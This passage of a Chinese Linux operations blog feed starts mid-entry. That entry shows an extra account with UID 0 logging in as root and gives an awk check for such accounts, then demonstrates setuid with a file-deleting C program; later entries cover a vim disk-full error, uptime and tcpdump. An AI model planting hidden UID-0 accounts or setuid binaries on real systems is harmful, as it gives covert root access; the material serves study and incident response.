class="hljs-number">114.132.246.141</span><br><span class="hljs-attribute">test123</span>@<span class="hljs-number">114.132.246.141</span>&#x27;s password:<br><span class="hljs-attribute">Welcome</span> to Ubuntu <span class="hljs-number">20</span>.<span class="hljs-number">04</span> LTS (GNU/Linux <span class="hljs-number">5</span>.<span class="hljs-number">4</span>.<span class="hljs-number">0</span>-<span class="hljs-number">77</span>-generic x86_64)<br><br><span class="hljs-comment"># id</span><br><span class="hljs-attribute">uid</span>=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root)<br></code></pre></td></tr></table></figure><p>默认添加的普通用户bash为&#x2F;bin&#x2F;sh，如果将bash替换为&#x2F;bin&#x2F;bash，使用被提升账户登录后就直接是root</p><p>应急响应需要注意点：</p><p>检查是否存在非root的特权账户</p><p>awk -F: ‘$3&#x3D;&#x3D;0{print $1}’ &#x2F;etc&#x2F;passwd</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@VM-<span class="hljs-number">8</span>-<span class="hljs-number">5</span>-ubuntu:/home/ubuntu# awk -F: &#x27;$<span class="hljs-number">3</span>==<span class="hljs-number">0</span>&#123;print $<span class="hljs-number">1</span>&#125;&#x27; /etc/passwd<br><span class="hljs-attribute">root</span><br><span class="hljs-attribute">test123</span><br></code></pre></td></tr></table></figure><h1 id="passwd"><a href="#passwd" class="headerlink" title="passwd"></a>passwd</h1><p>用户修改用户密码</p><p>默认加密方式为sha512，也就是shadow中以$6开头</p><p>test1:$6$Ld0DTWyFKov1udF7$t1zIuW.XOkBs&#x2F;SfFk1RGzLB9WMHPGgI&#x2F;bN7Q3aGsbliklViiClVLmRbaJ&#x2F;ZPzFuqp9VyoMCHnMJBJ.gLazOvf0:18953:0:99999:7:::</p><p>root@VM-8-5-ubuntu:&#x2F;home&#x2F;ubuntu# ls -lat &#x2F;usr&#x2F;bin&#x2F;passwd<br>-rwsr-xr-x 1 root root 68208 Apr 16  2020 &#x2F;usr&#x2F;bin&#x2F;passwd</p><h1 id="用户权限"><a href="#用户权限" class="headerlink" title="用户权限"></a>用户权限</h1><p>&#x2F;etc&#x2F;passwd第7列为用户所使用的shell，可以表示用户的部分权限</p><p>常见值为 &#x2F;bin&#x2F;bash &#x2F;bin&#x2F;sh &#x2F;usr&#x2F;sbin&#x2F;nologin &#x2F;bin&#x2F;false</p><p>区别</p><p>&#x2F;bin&#x2F;bash 可以登录系统</p><p>&#x2F;bin&#x2F;sh 可以登录系统，软链接（centos下 &#x2F;bin&#x2F;sh -&gt; bash; ubuntu 下&#x2F;bin&#x2F;sh -&gt; dash）</p><p>&#x2F;usr&#x2F;sbin&#x2F;nologin 只不允许登录系统</p><p>&#x2F;bin&#x2F;false 最严格的禁止login选项，一切服务均不可用</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby">(base) root<span class="hljs-variable">@VM</span>-<span class="hljs-number">8</span>-<span class="hljs-number">5</span>-<span class="hljs-symbol">ubuntu:</span>/home/ubuntu<span class="hljs-comment"># cat /etc/passwd | grep test | more</span><br><span class="hljs-symbol">test:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1003</span><span class="hljs-symbol">:</span><span class="hljs-number">1003</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/home/test</span><span class="hljs-symbol">:/bin/sh</span><br><span class="hljs-symbol">test1:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1004</span><span class="hljs-symbol">:</span><span class="hljs-number">1004</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/home/test1</span><span class="hljs-symbol">:/usr/sbin/login</span><br><span class="hljs-symbol">test2:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1005</span><span class="hljs-symbol">:</span><span class="hljs-number">1005</span><span class="hljs-symbol">:</span>,,,<span class="hljs-symbol">:/home/test2</span><span class="hljs-symbol">:/bin/false</span><br></code></pre></td></tr></table></figure><h1 id="setuid"><a href="#setuid" class="headerlink" title="setuid"></a>setuid</h1><p>&#x2F;etc&#x2F;shadow权限为000，也就是说普通用户没有任何权限，那为什么普通用户可以修改自己的密码？</p><p>查询资料得知，是因为passwd命令存在s标记，且在文件系统中&#x2F;usr&#x2F;bin&#x2F;passwd文件归属于root:root,所以在passwd运行时将以root权限。</p><p>s标记来源setuid。</p><p>setuid</p><p>setuid设置的程序，任何用户执行时，均以该文件在文件系统中的归属者权限运行。</p><p>测试案例：</p><p>root环境下编写c文件，nc0.c</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pwd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">struct</span>  <span class="hljs-title class_">passwd</span> *pwd;<br>    pwd = <span class="hljs-built_in">getpwuid</span>(<span class="hljs-built_in">getuid</span>());<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s uid is: %d\n&quot;</span>,pwd-&gt;pw_name,<span class="hljs-built_in">geteuid</span>());<br>    <span class="hljs-built_in">sleep</span>(<span class="hljs-number">30</span>);<br>    <span class="hljs-built_in">remove</span>(<span class="hljs-string">&quot;nc0del.txt&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br> &#125;<br></code></pre></td></tr></table></figure><p>编译生成二进制文件nc0</p><p>gcc nc0.c -o nc0</p><p>创建root权限文件nc0del.txt</p><p>touch nc0del.txt</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tap">root@VM-8-5-ubuntu:/opt/nc0<span class="hljs-comment"># ls -l</span><br>total 24<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 16920 </span>Nov<span class="hljs-number"> 22 </span>22:46 nc0<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 237 </span>Nov<span class="hljs-number"> 22 </span>22:41 nc0.c<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 0 </span>Nov<span class="hljs-number"> 22 </span>22:42 nc0del.txt<br></code></pre></td></tr></table></figure><p>没有设置setuid执行nc0</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs tap">$ id<br>uid=1002(nc0) gid=1002(nc0) groups=1002(nc0)<br>$ pwd<br>/opt/nc0<br>$ ls -l<br>total 24<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 16920 </span>Nov<span class="hljs-number"> 22 </span>22:46 nc0<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 237 </span>Nov<span class="hljs-number"> 22 </span>22:41 nc0.c<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 0 </span>Nov<span class="hljs-number"> 22 </span>22:42 nc0del.txt<br>$ ./nc0<br>nc0 uid is: 1002<br>$ ls -l<br>total 24<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 16920 </span>Nov<span class="hljs-number"> 22 </span>22:46 nc0<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 237 </span>Nov<span class="hljs-number"> 22 </span>22:41 nc0.c<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 0 </span>Nov<span class="hljs-number"> 22 </span>22:42 nc0del.txt<br></code></pre></td></tr></table></figure><p>可以看到执行nc0，并没有删除root权限的nc0test.txt</p><p>设置setuid执行nc0</p><p>chmod +s nc0</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs tap">root@VM-8-5-ubuntu:/opt/nc0<span class="hljs-comment"># ls -l</span><br>total 24<br>-rwxr-xr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 16920 </span>Nov<span class="hljs-number"> 22 </span>22:46 nc0<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 237 </span>Nov<span class="hljs-number"> 22 </span>22:41 nc0.c<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 0 </span>Nov<span class="hljs-number"> 22 </span>22:42 nc0del.txt<br>root@VM-8-5-ubuntu:/opt/nc0<span class="hljs-comment"># chmod +s nc0</span><br>root@VM-8-5-ubuntu:/opt/nc0<span class="hljs-comment"># ls -l</span><br>total 24<br>-rwsr-sr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 16920 </span>Nov<span class="hljs-number"> 22 </span>22:46 nc0<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 237 </span>Nov<span class="hljs-number"> 22 </span>22:41 nc0.c<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 0 </span>Nov<span class="hljs-number"> 22 </span>22:42 nc0del.txt<br></code></pre></td></tr></table></figure><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs tap">$ ls -l<br>total 24<br>-rwsr-sr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 16920 </span>Nov<span class="hljs-number"> 22 </span>22:46 nc0<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 237 </span>Nov<span class="hljs-number"> 22 </span>22:41 nc0.c<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 0 </span>Nov<span class="hljs-number"> 22 </span>22:42 nc0del.txt<br>$ ./nc0<br>nc0 uid is: 0<br>$ ls -l<br>total 24<br>-rwsr-sr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 16920 </span>Nov<span class="hljs-number"> 22 </span>22:46 nc0<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 237 </span>Nov<span class="hljs-number"> 22 </span>22:41 nc0.c<br><br><br>root@VM-8-5-ubuntu:/opt/nc0<span class="hljs-comment"># ps -ef | grep nc0</span><br>root       <span class="hljs-number"> 2532 </span>   <span class="hljs-number"> 840 </span><span class="hljs-number"> 0 </span>22:45 ?        00:00:00 sshd: nc0 [priv]<br>nc0        <span class="hljs-number"> 2553 </span>     <span class="hljs-number"> 1 </span><span class="hljs-number"> 0 </span>22:45 ?        00:00:00 /lib/systemd/systemd --user<br>nc0        <span class="hljs-number"> 2562 </span>  <span class="hljs-number"> 2553 </span><span class="hljs-number"> 0 </span>22:45 ?        00:00:00 (sd-pam)<br>nc0        <span class="hljs-number"> 2633 </span>  <span class="hljs-number"> 2532 </span><span class="hljs-number"> 0 </span>22:45 ?        00:00:00 sshd: nc0@pts/1<br>nc0        <span class="hljs-number"> 2639 </span>  <span class="hljs-number"> 2633 </span><span class="hljs-number"> 0 </span>22:45 pts/1    00:00:00 -sh<br>root       <span class="hljs-number"> 4738 </span>  <span class="hljs-number"> 2639 </span><span class="hljs-number"> 0 </span>22:55 pts/1    00:00:00 ./nc0<br></code></pre></td></tr></table></figure><p>可以看到执行nc0命令的时候是以root的权限运行的，成功删除root权限文件，同时可以看到执行的用户是root用户。</p><p>常见setuid的命令</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs tap">root@VM-8-5-ubuntu:/opt/nc0<span class="hljs-comment"># ls -l /usr/bin/ | grep &quot;rws&quot;</span><br>-rwsr-sr-x<span class="hljs-number"> 1 </span>daemon daemon     <span class="hljs-number"> 55560 </span>Nov<span class="hljs-number"> 13 </span><span class="hljs-number"> 2018 </span>at<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 85064 </span>Apr<span class="hljs-number"> 16 </span><span class="hljs-number"> 2020 </span>chfn<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 53040 </span>Apr<span class="hljs-number"> 16 </span><span class="hljs-number"> 2020 </span>chsh<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 39144 </span>Mar <span class="hljs-number"> 7 </span><span class="hljs-number"> 2020 </span>fusermount<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 88464 </span>Apr<span class="hljs-number"> 16 </span><span class="hljs-number"> 2020 </span>gpasswd<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 55528 </span>Apr <span class="hljs-number"> 2 </span><span class="hljs-number"> 2020 </span>mount<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 44784 </span>Apr<span class="hljs-number"> 16 </span><span class="hljs-number"> 2020 </span>newgrp<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 68208 </span>Apr<span class="hljs-number"> 16 </span><span class="hljs-number"> 2020 </span>passwd<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 31032 </span>May<span class="hljs-number"> 26 </span>19:50 pkexec<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 67816 </span>Apr <span class="hljs-number"> 2 </span><span class="hljs-number"> 2020 </span>su<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root      <span class="hljs-number"> 166056 </span>Jan<span class="hljs-number"> 19 </span><span class="hljs-number"> 2021 </span>sudo<br>-rwsr-xr-x<span class="hljs-number"> 1 </span>root   root       <span class="hljs-number"> 39144 </span>Apr <span class="hljs-number"> 2 </span><span class="hljs-number"> 2020 </span>umount<br></code></pre></td></tr></table></figure><p>setuid注意事项</p><p>1、setuid基于安全考虑，只在二进制文件有效</p><p>测试在sh脚本的有效性，可以添加属性，但是无法生效</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@VM-8-5-ubuntu:/opt/nc0<span class="hljs-comment"># cat nc0.sh</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;*当前登陆的用户名:<span class="hljs-variable">$USER</span>   UID:<span class="hljs-variable">$UID</span>&quot;</span><br><span class="hljs-built_in">rm</span> -rf nc0del.txt<br></code></pre></td></tr></table></figure><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tap">root@VM-8-5-ubuntu:/opt/nc0<span class="hljs-comment"># ls -lat *</span><br>-rw-r--r--<span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 0 </span>Nov<span class="hljs-number"> 23 </span>17:06 nc0del.txt<br>-rwSr--r--<span class="hljs-number"> 1 </span>root root   <span class="hljs-number"> 68 </span>Nov<span class="hljs-number"> 23 </span>17:06 nc0.sh<br>-rwsr-sr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 16920 </span>Nov<span class="hljs-number"> 22 </span>22:46 nc0<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 237 </span>Nov<span class="hljs-number"> 22 </span>22:41 nc0.c<br></code></pre></td></tr></table></figure><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs tap">$ id<br>uid=1002(nc0) gid=1002(nc0) groups=1002(nc0)<br>$ cd /opt/nc0<br>$ ls -lat<br>total 36<br>drwxr-xr-x<span class="hljs-number"> 2 </span>root root <span class="hljs-number"> 4096 </span>Nov<span class="hljs-number"> 23 </span>17:06 .<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 0 </span>Nov<span class="hljs-number"> 23 </span>17:06 nc0del.txt<br>-rwSr--r--<span class="hljs-number"> 1 </span>root root   <span class="hljs-number"> 68 </span>Nov<span class="hljs-number"> 23 </span>17:06 nc0.sh<br>-rwsr-sr-x<span class="hljs-number"> 1 </span>root root<span class="hljs-number"> 16920 </span>Nov<span class="hljs-number"> 22 </span>22:46 nc0<br>drwxr-xr-x<span class="hljs-number"> 4 </span>root root <span class="hljs-number"> 4096 </span>Nov<span class="hljs-number"> 22 </span>22:42 ..<br>-rw-r--r--<span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 237 </span>Nov<span class="hljs-number"> 22 </span>22:41 nc0.c<br>$ bash nc0.sh<br>*当前登陆的用户名:nc0   UID:1002<br>rm: cannot remove &#x27;nc0del.txt&#x27;: Permission denied<br>$<br></code></pre></td></tr></table></figure><p>参考链接：</p><p><a href="https://www.cnblogs.com/lsdb/p/12197090.html">https://www.cnblogs.com/lsdb/p/12197090.html</a></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>error_vim_E514_write_error_file_system_full</title>
    <link href="/2024/04/03/yunwei/errors/error_vim_E514_write_error_file_system_full/"/>
    <url>/2024/04/03/yunwei/errors/error_vim_E514_write_error_file_system_full/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>CentOS6系统中使用vim 修改文件保存时出现报错</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">E514: <span class="hljs-built_in">write</span> <span class="hljs-keyword">error</span> (<span class="hljs-built_in">file</span> system full?)<br></code></pre></td></tr></table></figure><h2 id="排查过程"><a href="#排查过程" class="headerlink" title="排查过程"></a>排查过程</h2><p>从报错上看是磁盘容量导致的问题，查看磁盘使用情况 df -h </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@webscan-54 vsftpd]<span class="hljs-comment"># df -h</span><br>Filesystem      Size  Used Avail Use% Mounted on<br>/dev/sda1       4.0G  4.0G     0 100% /<br>tmpfs            24G     0   24G   0% /dev/shm<br>/dev/sda7       9.9G  8.1G  1.3G  87% /data1<br>/dev/sdb1       2.7T  1.6T 1021G  61% /data2<br>/dev/sda5       7.9G  345M  7.2G   5% /tmp<br>/dev/sda3        12G  7.6G  3.7G  68% /usr<br>/dev/sda6       7.9G  2.7G  4.8G  36% /var<br></code></pre></td></tr></table></figure><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>清理磁盘</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>errors</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>errors</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>uptime</title>
    <link href="/2024/04/03/yunwei/commands/uptime/"/>
    <url>/2024/04/03/yunwei/commands/uptime/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="uptime"><a href="#uptime" class="headerlink" title="uptime"></a>uptime</h2><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># uptime</span><br> 23:36:12 up<span class="hljs-number"> 59 </span>days, 14:03, <span class="hljs-number"> 2 </span>users,  load average: 0.06, 0.09, 0.07<br></code></pre></td></tr></table></figure><p>当前时间：23:36:12</p><p>系统运行状态：up</p><p>系统已运行时间：59 days, 14:03，已运行59天14小时3分钟</p><p>当前登录用户数：2 users</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@iZbp1191gh7vw52537lyxrZ ~]# who<br>root     tty1         2022<span class="hljs-string">-06</span><span class="hljs-string">-26</span> 09:35<br>root     pts/0        2022<span class="hljs-string">-08</span><span class="hljs-string">-24</span> 22:39 (125.33.205.114)<br></code></pre></td></tr></table></figure><p>系统负载：load average: 0.06, 0.09, 0.07</p><p>过去1分钟，5分钟和15分钟的平均负载</p><h2 id="uptime-p-系统运行时间"><a href="#uptime-p-系统运行时间" class="headerlink" title="uptime -p 系统运行时间"></a>uptime -p 系统运行时间</h2><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># uptime -p</span><br>up<span class="hljs-number"> 8 </span>weeks,<span class="hljs-number"> 3 </span>days,<span class="hljs-number"> 14 </span>hours,<span class="hljs-number"> 11 </span>minutes<br></code></pre></td></tr></table></figure><h2 id="uptime-s-系统启动时间"><a href="#uptime-s-系统启动时间" class="headerlink" title="uptime -s 系统启动时间"></a>uptime -s 系统启动时间</h2><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@iZbp1191gh7vw52537lyxrZ</span> ~]<span class="hljs-meta"># uptime -s</span><br><span class="hljs-number">2022</span><span class="hljs-number">-06</span><span class="hljs-number">-26</span> <span class="hljs-number">09</span>:<span class="hljs-number">32</span>:<span class="hljs-number">57</span><br></code></pre></td></tr></table></figure><h2 id="数据来源"><a href="#数据来源" class="headerlink" title="数据来源"></a>数据来源</h2><p>&#x2F;var&#x2F;run&#x2F;utmp</p><p>&#x2F;proc</p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tcpdump</title>
    <link href="/2024/04/03/yunwei/commands/tcpdump/"/>
    <url>/2024/04/03/yunwei/commands/tcpdump/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>tcpdump 用于抓取网络数据包，Linux必须为root权限</p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p>tcpdump 参数</p><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><h4 id="i"><a href="#i" class="headerlink" title="-i"></a>-i</h4><p>指定要抓取的网卡</p><h4 id="port-端口号"><a href="#port-端口号" class="headerlink" title="port 端口号"></a>port 端口号</h4><p>指定要抓取的端口(源或目的)</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dns">[root@localhost tmp]# tcpdump -i eth0 port <span class="hljs-number">1234</span> -v<br>dropped privs to tcpdump<br>tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size <span class="hljs-number">262144</span> bytes<br><span class="hljs-number">23</span>:<span class="hljs-number">41</span>:<span class="hljs-number">03.519911</span> IP (tos <span class="hljs-number">0</span>x0, ttl <span class="hljs-number">60</span>, id <span class="hljs-number">29943</span>, offset <span class="hljs-number">0</span>, flags [DF], proto TCP (<span class="hljs-number">6</span>), length <span class="hljs-number">60</span>)<br>    <span class="hljs-number">10.210.128.37</span>.<span class="hljs-number">53670</span> &gt; <span class="hljs-number">10.13.8.56</span>.search-agent: Flags [S], cksum <span class="hljs-number">0</span>xc4ec (correct), seq <span class="hljs-number">2917953384</span>, win <span class="hljs-number">64240</span>, options [mss <span class="hljs-number">1460</span>,sackOK,TS val <span class="hljs-number">2673498046</span> ecr <span class="hljs-number">0</span>,nop,wscale <span class="hljs-number">7</span>], length <span class="hljs-number">0</span><br><span class="hljs-number">23</span>:<span class="hljs-number">41</span>:<span class="hljs-number">03.519977</span> IP (tos <span class="hljs-number">0</span>x0, ttl <span class="hljs-number">64</span>, id <span class="hljs-number">54948</span>, offset <span class="hljs-number">0</span>, flags [none], proto TCP (<span class="hljs-number">6</span>), length <span class="hljs-number">60</span>)<br>    <span class="hljs-number">10.13.8.56</span>.search-agent &gt; <span class="hljs-number">10.210.128.37</span>.<span class="hljs-number">53670</span>: Flags [S.], cksum <span class="hljs-number">0</span>x9d6a (incorrect -&gt; <span class="hljs-number">0</span>x10bd), seq <span class="hljs-number">69084297</span>, ack <span class="hljs-number">2917953385</span>, win <span class="hljs-number">28960</span>, options [mss <span class="hljs-number">1460</span>,sackOK,TS val <span class="hljs-number">1031657418</span> ecr <span class="hljs-number">2673498046</span>,nop,wscale <span class="hljs-number">7</span>], length <span class="hljs-number">0</span><br><span class="hljs-number">23</span>:<span class="hljs-number">41:03.521252</span> IP (tos <span class="hljs-number">0</span>x0, ttl <span class="hljs-number">60</span>, id <span class="hljs-number">29944</span>, offset <span class="hljs-number">0</span>, flags [DF], proto TCP (<span class="hljs-number">6</span>), length <span class="hljs-number">52</span>)<br>    <span class="hljs-number">10.210.128.37</span>.<span class="hljs-number">53670</span> &gt; <span class="hljs-number">10.13.8.56</span>.search-agent: Flags [.], cksum <span class="hljs-number">0</span>xaeb1 (correct), ack <span class="hljs-number">1</span>, win <span class="hljs-number">502</span>, options [nop,nop,TS val <span class="hljs-number">2673498048</span> ecr <span class="hljs-number">1031657418</span>], length <span class="hljs-number">0</span><br>^C<br><span class="hljs-number">3</span> packets captured<br><span class="hljs-number">8</span> packets received by filter<br><span class="hljs-number">0</span> packets dropped by kernel<br></code></pre></td></tr></table></figure><h4 id="src-port-端口号"><a href="#src-port-端口号" class="headerlink" title="src port 端口号"></a>src port 端口号</h4><p>指定要抓取源端口</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">[root@localhost tmp]# tcpdump -i eth0 src port <span class="hljs-number">1234</span> -v<br>dropped privs <span class="hljs-keyword">to</span> tcpdump<br>tcpdump: listening <span class="hljs-keyword">on</span> eth0, link-<span class="hljs-keyword">type</span> EN10MB (Ethernet), capture size <span class="hljs-number">262144</span> bytes<br><span class="hljs-number">23</span>:<span class="hljs-number">39</span>:<span class="hljs-number">28.345555</span> IP (tos <span class="hljs-number">0x0</span>, ttl <span class="hljs-number">64</span>, id <span class="hljs-number">50988</span>, <span class="hljs-keyword">offset</span> <span class="hljs-number">0</span>, flags [<span class="hljs-keyword">none</span>], proto TCP (<span class="hljs-number">6</span>), length <span class="hljs-number">60</span>)<br>    <span class="hljs-number">10.13</span><span class="hljs-number">.8</span><span class="hljs-number">.56</span>.<span class="hljs-keyword">search</span>-agent &gt; <span class="hljs-number">10.210</span><span 